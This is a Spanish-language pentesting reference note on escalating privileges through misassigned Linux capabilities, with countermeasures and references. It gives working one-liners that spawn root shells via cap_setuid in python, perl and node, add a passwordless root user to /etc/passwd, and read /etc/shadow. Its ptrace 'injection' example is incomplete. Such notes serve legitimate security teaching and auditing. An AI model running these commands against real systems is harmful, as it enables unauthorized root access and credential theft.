# Explotación de Linux Capabilities

## Descripción
Las capabilities de Linux son un mecanismo de control de acceso que divide los privilegios de root en unidades granulares independientes. En lugar de otorgar todos los privilegios de root a un binario (como con SUID), se pueden asignar capacidades específicas como `cap_setuid`, `cap_net_raw` o `cap_dac_override`. Sin embargo, cuando se asignan capabilities peligrosas a binarios accesibles por usuarios sin privilegios, un atacante puede abusar de ellas para escalar privilegios. Por ejemplo, `cap_setuid` permite cambiar el UID del proceso a 0 (root), y `cap_dac_override` permite ignorar permisos de lectura/escritura en archivos.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid)
- **Plataforma**: Linux
- **Dificultad**: Intermedia

## Herramientas
- **getcap** — enumeración de capabilities asignadas a binarios en el sistema
- **setcap** — asignación de capabilities (requiere privilegios)
- **GTFOBins** (https://gtfobins.github.io/) — referencia de explotación de binarios con capabilities
- **linPEAS** (`linpeas.sh`) — enumeración automatizada que reporta capabilities peligrosas

## Comandos / Ejemplos

### Enumeración de capabilities
```bash
# Buscar todas las capabilities asignadas en el sistema
getcap -r / 2>/dev/null

# Ejemplo de salida:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/ping = cap_net_raw+ep
# /usr/bin/vim = cap_dac_override+ep
# /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip

# Verificar capabilities de un binario específico
getcap /usr/bin/python3.8
```

### Explotación: cap_setuid
```bash
# Si python3 tiene cap_setuid+ep
# Cambiar UID a 0 (root) y ejecutar shell
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Si perl tiene cap_setuid+ep
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# Si node tiene cap_setuid+ep
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
```

### Explotación: cap_dac_override
```bash
# Si vim tiene cap_dac_override+ep — permite leer/escribir cualquier archivo
# Leer /etc/shadow
vim /etc/shadow

# Añadir usuario root sin contraseña a /etc/passwd
vim /etc/passwd
# Añadir línea: hacker::0:0::/root:/bin/bash
```

### Explotación: cap_dac_read_search
```bash
# Si tar tiene cap_dac_read_search+ep — permite leer cualquier archivo
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/
cat /tmp/etc/shadow
```

### Explotación: cap_sys_ptrace
```bash
# Si un proceso tiene cap_sys_ptrace — permite adjuntarse a procesos de root
# Inyectar shellcode en un proceso root usando ptrace
python3 -c '
import ctypes
import sys

# PID de un proceso root
pid = int(sys.argv[1])
libc = ctypes.cdll.LoadLibrary("libc.so.6")
libc.ptrace(16, pid, 0, 0)  # PTRACE_ATTACH
' <root_pid>
```

### Capabilities peligrosas — referencia rápida
```
cap_setuid          → Cambiar UID a root
cap_setgid          → Cambiar GID a root
cap_dac_override    → Ignorar permisos de lectura/escritura/ejecución
cap_dac_read_search → Ignorar permisos de lectura y búsqueda en directorios
cap_sys_ptrace      → Adjuntarse a procesos (inyección)
cap_sys_admin       → Múltiples operaciones administrativas (mount, etc.)
cap_sys_module      → Cargar/descargar módulos del kernel
cap_net_raw         → Crear sockets raw (sniffing)
cap_fowner          → Ignorar verificación de propietario en archivos
```

## Contramedidas
- Auditar regularmente las capabilities asignadas con `getcap -r /` y eliminar las innecesarias
- No asignar capabilities peligrosas (`cap_setuid`, `cap_dac_override`, `cap_sys_admin`, `cap_sys_module`) a binarios accesibles por usuarios regulares
- Usar capabilities con el flag `+p` (permitted) en lugar de `+ep` (effective + permitted) cuando sea posible
- Preferir capabilities específicas sobre SUID, pero aplicar el mismo principio de mínimo privilegio
- Monitorear cambios en capabilities con herramientas de integridad de archivos

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1548.001: Abuse Elevation Control Mechanism: Setuid and Setgid. https://attack.mitre.org/techniques/T1548/001/
- GTFOBins. (s.f.). *GTFOBins* [Base de datos]. https://gtfobins.github.io/
- OccupyTheWeb. (2018). *Linux Basics for Hackers*. No Starch Press.
- Allen, L. (2018). *Mastering Kali Linux for Advanced Penetration Testing* (2nd ed.). Packt Publishing.
- Notas del proyecto: notas-md/HNotes/HNotes/Hacking/Privilege Escalation.md
